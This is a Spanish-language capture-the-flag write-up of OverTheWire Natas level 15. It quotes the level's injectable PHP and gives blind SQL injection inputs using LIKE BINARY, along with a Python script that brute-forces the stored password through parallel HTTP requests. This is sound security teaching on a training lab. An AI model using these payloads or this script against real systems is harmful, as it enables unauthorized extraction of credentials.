Este nivel consiste en un buscador de usuarios. El código nos da en un comentario una pista sobre los campos de la tabla `users`:

```php
<?php  
  
/*  
CREATE TABLE `users` (  
  `username` varchar(64) DEFAULT NULL,  
  `password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }    $res = mysqli_query($link, $query);  
    if($res) {  
    if(mysqli_num_rows($res) > 0) {  
        echo "This user exists.<br>";  
    } else {  
        echo "This user doesn't exist.<br>";  
    }  
    } else {  
        echo "Error in query.<br>";  
    }    mysqli_close($link);  
} else {  
?>
```

Resulta lógico buscar al usuario con la sintaxis usual de estos niveles: `natas16`, ya que verificamos que este existe, pasamos a escribir nuestro *query*. Aquí debemos agregar el campo `password`, en contraste con el nivel anterior:

```
username = natas16 " and password LIKE "a%"
```

```sql
 SELECT * from users where username="natas16" and password LIKE "a%"
```

En un primer acercamiento, seleccionamos las contraseñas que comiencen con `a` usando la instrucción `LIKE`, donde el carácter de porcentaje `%` sirve de comodín. Probando distintos caracteres, hasta encontrar un "usuario existente", veremos que el primer carácter de la contraseña es `h` y podremos continuar este método hasta completar la contraseña:

```
username = natas16 " and password LIKE "ha%"
```

```sql
 SELECT * from users where username="natas16" and password LIKE "ha%"
```

Sin embargo, hay un par de problemas con este método:
1. La contraseña no es corta y realizarlo manualmente se vuelve tedioso rápidamente, debemos hacer un script.
2. Si probamos la letra `H`, la consulta también será exitosa, esto se debe a que la búsqueda no distingue entre mayúsculas y minúsculas, es *case insensitive*. Para modificar este comportamiento debemos agregar la función `BINARY`, que convierte la cadena a binario antes de pasar a la función `LIKE`.

```
username = natas16 " and password LIKE BINARY "a%"
```

```sql
 SELECT * from users where username="natas16" and password LIKE BINARY "a%"
```

El script puede ser implementado de infinitas formas, para [esta solución](https://github.com/IberoGIC/gic-level-2/blob/main/Challenges/OTW_Natas/Lvl_15/Ordenmoria/script.py) se usa python.

Construimos una lista que contiene todos los caracteres posibles para la contraseña (mayúsculas, minúsculas y números).
```python
alphanumeric = string.ascii_letters + string.digits
```

Definimos una función para enviar una petición a la página web, especificando el valor del campo `username` en el formulario y los datos de la autenticación del nivel: `username` y `password`.

```python
def send_request(current_password, char):
    try:
        form_data = {'username': 'natas16" and password LIKE BINARY "' + current_password + char + '%'}
        response = requests.post(url, data=form_data, auth=HTTPBasicAuth(username, password))
        if "This user exists." in response.text:
            return True, char
        else:
            return False, char

    except requests.exceptions.RequestException as e:
        return False, None
```

Enviamos una petición por cada carácter, en procesos paralelos, y agregamos el carácter con respuesta exitosa a la contraseña.

```python
def perform_parallel_requests(current_password):  
    # Create a ThreadPoolExecutor to handle multiple requests in parallel  
    with ThreadPoolExecutor(max_workers= len(alphanumeric)) as executor:  
        # Submit request for each character  
        futures = [executor.submit(send_request, current_password, char) for char in alphanumeric]  
  
        # Wait for all futures to complete and collect results  
        for future in futures:  
            user_exists, char = future.result()  
            if user_exists:  
                    return current_password + char  
        return current_password
```

Repetimos las peticiones paralelas hasta que no se agregue un nuevo carácter a la contraseña .

```python
while current_password != last_password:  
    last_password = current_password  
    current_password = perform_parallel_requests(current_password)  
    print(current_password)
```


---
## **Conclusión**

Este nivel demuestra cómo una inyección SQL sencilla puede ser explotada para realizar un ataque de fuerza bruta optimizado y subraya la necesidad de implementar prácticas seguras en el manejo de entradas de usuario.

---
-,"  
[_P
